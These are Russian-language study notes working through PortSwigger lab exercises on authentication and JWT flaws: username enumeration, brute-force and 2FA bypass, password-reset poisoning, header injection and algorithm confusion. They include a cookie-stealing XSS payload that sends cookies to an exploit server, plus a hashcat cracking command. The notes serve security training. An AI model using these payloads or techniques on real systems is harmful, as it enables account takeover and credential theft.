# Authentication
Авторы нас заверяют, что в работе будут использоваться следующие вордлисты:
- [[0 - UsernameList]]
- [[0 - PasswordList]]
## Теория
[[5 - Уязвимости аутентификации и авторизации]]
https://portswigger.net/web-security/authentication
## Bruteforce
### [Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)
Итак, очевидно и уже привычно используем интрудер.

В нем есть удобная опция - поставить атаку на паузу, когда в ответе не будет какого-то значения (Settings -> Auto-pause attack). Добавляем туда Invalid username и находим логин applications.

С этим логином перебираем пароли, на montana получаем ответ 302, что сигнализирует об успешном входе.

### [Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)
Хыхыхых, типичный ответ - "Invalid username or password.". Ставим это в условие остановки атаки, и видим, что при логине `al` атака остановилась. В ответе видим это же, но без точки. Попались.

Ставим это в качестве логина и ждем, пока не получится 302 перебором паролей. И действительно, при пароле `charlie` получаем 302.

### [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)
Пытаемся по базе начать перебирать логины и смотреть, насколько долго займет запрос (а пароль специально поставим из 100 символов).

Очень быстро ловим ограничение количества попыток входа. Что интересно, в аккаунт с правильными данными нас тоже теперь не пускает.

Ищем способы обхода таких штук и находим заголовок `X-Forwarded-For`. 

Всё, запускаем Pitchfork Attack, где в `X-Forwarded-For` числа от 1 до 100, а в username наши вариантики. Ошибки действительно нет. 

Отображаем колонки Response received и response completed. У большинства запросов значения собраны вокруг 100, в то время как у запроса с нашим логином (wiener) и ещё одним они составляют ~550. Отсюда делаем вывод, что логин это второй вариант с большой задержкой, то есть `app1`.

Теперь осталось перебрать пароли для этого варианта. При пароле freedom получаем 302. Поскольку мы до сих пор заблокированы в браузере, перехватываем запрос proxy и добавляем заголовок X-Forwarded-For и сюда.

### [Broken brute-force protection, IP block](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
Видим, что локает спустя 3 неудачных попытки. Можно бы было каждой третьей кидать логин в успешного юзера, потому что он ресетает наши попытки, но эксперименты почему-то были стабильнее с правильным заходом каждую 2-ю попытку.

Ну всё, теперь обычный брутфорс, но через 1 попытку заходим в успешный акк, питоновский скрипт могу показать.

### [Username enumeration via account lock](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)
Здесь у несуществующих аккаунтов нет ограничения на количество попыток входа, а у существующих есть. Поэтому можем просто по 5 раз попытаться войти в каждый из списка, если где-то напишет об ограничении, то изменится длина ответа и мы заметим.

Сначала я попытался через бурп, но там запросы посылаются настолько медленно, что я прошелся по всему списку и смену длины не словил.

А вот питоном получилось. Причем, я решил перебрать логины с паролем password, и внезапно словил 302. То есть выбрав совершенно случайный пароль, я подобрал и логин, и пароль и скипнул часть с перебором пароля существующего аккаунта.

### [Broken brute-force protection, multiple credentials per request](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)
Название говорит само за себя: в после password можно прокинуть массив паролей, и если среди них будет верный, то нас залогинит. Как-то разочаровывающе для моей первой экспертной лабы

## 2FA
### [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)
Из своего акка узнаем адрес страницы с инфой: `https://0abe009904471267815d34dd005b00d3.web-security-academy.net/my-account?id=wiener`

Затем просто входим в аккаунт жертвы, при этом меняя адрес на `/my-account?id=carlos` на экране 2FA.

### [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
Логинимся в свой акк, но после ввода 2FA перехватываем запрос.

Видим в cookie `verify=wiener` и подменяем наш логин на логин жертвы.

Не ожидал я, что нам придется брутфорсить otp из 4-х символов, но мы занимаемся именно этим. Разумеется, при помощи нашего хорошего друга питона.

Хотя я параллельно запустил бурп (питон идет с 9999 вниз, бурп с 0 наверх) и скорость питона, при том, что я сам поставил задержку в 0.01 секунды питону, всё равно идет примерно в 15 раз быстрее.

## Keep logged in
### [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
Зайдем в свой акк с галочкой "запомнить меня" и посмотрим, как выглядит выданная нам cookie: `d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`.

Закидываем её в Cybershef и нам сразу предлагает раскодировать из Base64: `wiener:51dc30ddc473d43a6011e9ebba6ca770`. Получили наш пароль и нечто подлежащее дальнейшему изучению. Основное предположение - это хэш пароля.

Поискав hash на том же кибершефе нашел "Analyze hash", который по длине хэша предложил несколько вариантов алгоритма, среди которых MD5,3,2 и какие-то ноунеймы. Пробуем захэшировать наш пароль MD5 и получаем совпадение!! Мы что, радужная таблица?

Ну что же, теперь осталось перебрать все пароли из нашего списка, захэшировав их в мд5 и добавив их после username:.

![[Auth JWT portswigger-1762186073108.webp]]

Пытаемся зайти на страницу `my-account?id=carlos`. С неправильным cookie нас отправляет на логин, с правильным - на эту страницу, так что включаем follow redirects и смотрим, у какого ответа другая длина.

### [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
Cookie строится по тому же принципу, что и в предыдущем случае.

Cookie надо угнать, и хоть до xss и остаётся ещё 5 лабораторок, не зря же у нас семестр у Башуна был. В комменте в блоге для PoC оставляем 
```html
<script>alert('XSS')</script>
```
И он действительно работает!! Так что следующим шагом загоняем туда <script>document.location='https://exploit-0aec00f30391daaa8035029901cf00d5.exploit-server.net/store?cookie='+document.cookie</script>`

И о чудо, оно экшели работает!! stay-logged-in=`Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`, что раскодируется в `carlos:26323c16d5f4dabff3bb136f2460a943`. 

Попробуем просто найти этот хэш в яндексе и получаем несколько сайтиков! Сайт пишет, что расхэшированное значени - `onceuponatime`. И он действительно подходит!!

## Reset password
### [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
Отправим себе ссылку на смену пароля и изучим её.

`/forgot-password?temp-forgot-password-token=puk6pzenkxxzaudl9riat9jwwi6klono`. Токен выглядит достаточно безопасным. 

Попробуем поставить пароль `password` и перехватим запрос. Его тело выглядит так: `temp-forgot-password-token=puk6pzenkxxzaudl9riat9jwwi6klono&username=wiener&new-password-1=password&new-password-2=password`. 

Здорово, юзернейм может меняться пользователем (мной!). Меняем его на carlos и заходим под ним.

### [Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
Снова ресетаем пароль от себя, но сразу перехватываем запрос. Попробуем добавить заголовок `X-Forwarded-Host: exploit-0a1f004403bad4f280dfca4a01d9006d.exploit-server.net` и поменяем username на carlos и посмотрим, сработает ли (ВНИМАНИЕ: https:// из url надо убрать, он всё ломает).

Поскольку пользователь глупенький, он нажимает на эту ссылку, после чего нам на сервер прилетает ссылка, которая для него сгенерировалась - `/forgot-password?temp-forgot-password-token=ngc2hkls29epiz7o1j6mfxiwv1vwx01c`.

## Change user password
### [Password brute-force via password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
Логинимся, идём менять пароль и смотрим запрос.

```
username=wiener&current-password=mypass&new-password-1=newpass&new-password-2=newpass
```
Username в теле запроса нам намекает, что его можно поменять на carlos и забрутфорсить пароли. Поскольку тут мы не ждём никакой индикации успешной атаки, периодически сами в браузере пытаемся зайти с новым паролем. 

На удивление, такой подход ничего не даёт. Тогда ещё немного поизучаем сайт и поймем, что в случае, если новый пароль 1 и 2 различаются, то при корректном и некорректном текущих паролях сообщения разные. Включаем переадресацию в атаке и идем искать `New passwords do not match`.

# JWT
## Теория
https://portswigger.net/web-security/jwt
https://portswigger.net/web-security/jwt/algorithm-confusion
[[5 - Уязвимости аутентификации и авторизации]]

## Flawed sig
### [JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
Логинимся, видим в session cookie JWT. При раскодировании видим там наше имя пользователя.

Я попытался потыкаться с isAdmin, но всё оказалось проще - имя пользователя надо поменять на administrator. 

### [JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
В jwt ставим alg: none и убираем подпись.

## Bruteforce
### [JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
Нам советуют использовать hashcat!! That's fun.

Команда выглядит так: `hashcat -a 0 -m 16500 eyJraWQiOiIwNWY0Y2ZkNi00NDlhLTRmMzAtYWUwZi0zMTFiZjBmMDBkMDgiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MjE5NzU2OCwic3ViIjoid2llbmVyIn0.QBxl7nP2nvrIOIdSGiLu3bjEf_WIZfTlP_gZ13TXvW0 jwt.secrets.list`

Секрет - `secret1`.

## Header injection
### [JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
JWT расширение для бурпа уже поставили раньше.

Добавили там RSA-ключ. Затем в репитере тыкнули Attack - Embedded JWK.

Поменяли имя пользователя на `administrator`, подписали тем же ключом.

### [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
Должно работать так же, как и в предыдущем случае, но прокидываем не сам ключ, а URL, с которого его надо взять.

Копируем из прошлого задания 
```json
{  
	"keys": [
		{
	        "kty": "RSA",  
	        "e": "AQAB",  
	        "kid": "812ea3d3-aa59-481c-9787-3e2f2f524fba",  
	        "n": "kSHu1aU4d-ou-LWbbz9eSSo-pf4qhqHgFiH98OPEkTGghjJFq5te7g5Fw6YJKdBTOSBiX5IGAoY0TjiVfZ2PsxzIfVi1n0fGZ-mmiUbUq2BlDC19Ti5QMlFm6fxxwWZ2jy9mDGkv19AjZ6_1kuxKtGmAd0GvPsHSblmCjdX3RHhuMKDBvqWFfAZlbMYslBHqFTQLwd-g5E7ecvx3F7JKCG5SFyGrR31LQy4NvDfMp_2mfRhbtmgnnpKWKMFPhHO70KVlpPfIZJdITa3Kz45oxf3eaRgsbKmh-9aiW2ukEyltc_hA54aMHVOTsLphemU69oMlbMDHI_W4Se5vuNBAhw"  
	    }
    ]
}
```
И прокидываем его на сервер злоумышленника (наш!!).

Затем в заголовки нашего JWT добавляем параметр `"jku": "https://exploit-0a6d004f042a6c5a80f911f2010b004c.exploit-server.net/exploit"`, и не забываем сменить kid в заголовке на прописанный здесь (в данном случае `812ea3d3-aa59-481c-9787-3e2f2f524fba`)

Ещё важно не забыть подписать финальную версию JWT (я несколько раз подписывал, затем вносил изменения и забывал переподписать)

### [JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
Создаём новый симметричный ключ и пытаемся оставить его пустым. Ничего не получается, так что прописываем в поле k null-байт, закодированный в Base64: `AA==`.

Затем в kid отправляемого JWT прокидываем "/dev/null" и подписываем его нашим пустым ключом. Пытаемся отправить его и ничего не получается. Поскольку мы искренне верим, что path traversal здесь должен работать, попробуем `../dev/null` и т.д., чтобы пофорсить относительные, а не абсолютные пути.

И в итоге `../../../dev/null` действительно приводит к 200!!

## Algorithm confusion
### [JWT authentication bypass via algorithm confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)
Суть - мы из асимметричного алгоритма меняемся на симметричный и строим подпись на основании публичного ключа.

Для начала надо получить ключ в стандартном эндопинте. В теории перечислены два: `/jwks.json` и `/.well-known/jwks.json`.  В данном случае подходит первый и возвращает нам:
```json
{"keys":
	[
		{
		"kty":"RSA", 
		"e":"AQAB", 
		"use":"sig", 
		"kid":"58f4a5dc-b709-4fcc-a33b-1a71e984017c", 
		"alg":"RS256", 
		"n":"wo-7z96wS9lwODSmi_qmEAcOhXKkJLBcFFvbvv4rgID0Z0m_c4bFHw3yi4F3upcg3UW0j7UKtNezAZa7rNCB3oH3xY3IdmgWeL77XokJv_4t1xYYvYZuvxCoi2QVS85dhbS98hHob8gyOgtcFSnyDVyz6ix89sMhzT8Um7913e-lfZc46bn_YoSqKkrQadliHtMDw4BqeF0lkOebT357jGp9ALamkL2bxkvaWEM_lAKbQTsGRLe3vampZZdc-59O1AAXf8mJYdJFyXq5czgspkJN8HotW3ZeXkOLKR64rR9t0bBEBMsODjAvNHka559noXROZsrmvcMhLqdfgjnJuQ"
		}
	]
}
```
Заходим во вкладку JWT в бурпе и добавляем RSA-ключ.

Вставляем туда единственный ключ из массива выше и затем переключаем тип на PEM, что сразу его конвертирует.

Затем идем в decoder и кодируем его в base64: `LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF3bys3ejk2d1M5bHdPRFNtaS9xbQpFQWNPaFhLa0pMQmNGRnZidnY0cmdJRDBaMG0vYzRiRkh3M3lpNEYzdXBjZzNVVzBqN1VLdE5lekFaYTdyTkNCCjNvSDN4WTNJZG1nV2VMNzdYb2tKdi80dDF4WVl2WVp1dnhDb2kyUVZTODVkaGJTOThoSG9iOGd5T2d0Y0ZTbnkKRFZ5ejZpeDg5c01oelQ4VW03OTEzZStsZlpjNDZibi9Zb1NxS2tyUWFkbGlIdE1EdzRCcWVGMGxrT2ViVDM1NwpqR3A5QUxhbWtMMmJ4a3ZhV0VNL2xBS2JRVHNHUkxlM3ZhbXBaWmRjKzU5TzFBQVhmOG1KWWRKRnlYcTVjemdzCnBrSk44SG90VzNaZVhrT0xLUjY0clI5dDBiQkVCTXNPRGpBdk5Ia2E1NTlub1hST1pzcm12Y01oTHFkZmdqbkoKdVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==`

Возвращаемся во вкладку с ключами и добавляем его как симметричный ключ, вручную заменяя значение k на вышеуказанную строку.

Всё, меняем наш JWT и подписываем его этим ключом, причем важно не забыть поменять алгоритм на симметричный (у нас на этом атака строится).

### [JWT authentication bypass via algorithm confusion with no exposed key](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key)
Ух, ломать RSA по нескольким примерам, моё любимое. К сожалению или к счастью, знания от Олега Олеговича применять не надо, скрипты уже написаны за нас. Рекомендуется полноценный репозиторий [`rsa_sign2n` GitHub repository](https://github.com/silentsignal/rsa_sign2n), либо упрощенная версия чисто для jwt, которая запускается командой 
```zsh
docker run --rm -it portswigger/sig2n <token1> <token2>
```
Теперь надо получить два токена. Для этого можно просто залогиниться дважды, потому что в jwt хранится время его истечения и выданные токены будут разными.
1. `eyJraWQiOiJiNmZjOWIwZS05ZWJjLTRhNDctOTM2Ni0xN2UxNGRlMTZkZWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MjI2NDAxMywic3ViIjoid2llbmVyIn0.bMk6N0AlaNWpNlQmXFCLkLi6NCbMKO4X8sZlQUISrBznvoA6mxfOEG1ea1L_9n-DOvZfby3jKJgmkLth5tOtuUwtCeuGazZ0G9EfPtEjzdtm1x30n8bHZMAAVjCS4D85IhsK7mtyASBXd05s7e1oaCvK1cl5ig3x5RKd4It6-Gh8-EWcP-XEi1HAq3V47mUIVJ4RqO4K6LBRdZHvubkxA-p_EqW6qx9N_rwb48MoMMqJJWd52LCCm7UhhgYjKrRsaRRUyjr_dcR4xnMTCg8_qQcLl3-oytHUWVheObM2w5LwiiDswGqx-vTz_VelXIBIxRLnpS1eygfieN_X7YaiTA`
2. `eyJraWQiOiJiNmZjOWIwZS05ZWJjLTRhNDctOTM2Ni0xN2UxNGRlMTZkZWMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MjI2NDE3Miwic3ViIjoid2llbmVyIn0.EQq28o0a_WY3986OdKvGxEbcbK0mt8KCxK_raDVM8c50haeeZSFWbm7C83D82_woucqKLKg-tJs-ueqroPKBAOPD3S6KGeAjz2uE07AtYnxGbNdLlOYnpgh2wsVaOzdJ_0zRZzxb9XJdGuAn3H7NYQXCIiYTa6OwQfuwiU2NLae0C2OvVgSHTNVgfYqTuKPfU4mwHTqFEFZVgthKl6JzMmAF_4AR63cSyGytl6PU7LCuaKdDXnEr3IN6H7fDuOBD6BUy-T1ocHInQETDKZiVXYOVw5iTJWlUe_vI3MZV40bmgPMlmIXHG4ONzbzzEwbmFoflchHdlt4J9FcJQXmpkQ`

Прикольно, ранилось секунд 5 и на 100% загрузило одно ядро мака.

В результате получили открытый ключ: `LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE1aklxcm14WDI5MStSbUkwbUlCTwoxQkR6Z25NMENGd3cwQ1B2SkM3dXZvRitSNEVyREJ5T25oeWV4NnlmMWFSZm9VOElVVCtGYll1WTZ6Y2dydTU4CjJ0Y3VWYXpDNmZvRVBlemtVT0g5OHNBZlhTTHZKenYxUHk5d2MvcFZaTFZyeXR3UHZaWTlDdGNrOVF4YjJHamwKbndxcGN6RVI3cEFqaUxPNW5GUDVpUmswZXJtb1lHRldYSTVEZWRWL1lKbTVCQys4L0J2bGhxSHdPN0VkK0xzWgo0Yk9Fb2JaWDg5N2treDQvZUI5eTFoVTNWTHMwclZ5UUFnN0Zkdnl2eUgzcEVyNVkvVWpEUFdqeDFobmJBeUtaCm1WRXJ3NC9qV3VqRmlyYzQ0U000MDh0VGJ3enlXMGRIa3lUNTRVY1BjcWI2andoVVFJMFk4Nk0zb0czN3d1bWIKUndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==`

Всё, оставшийся алгоритм описан в предыдущем задании.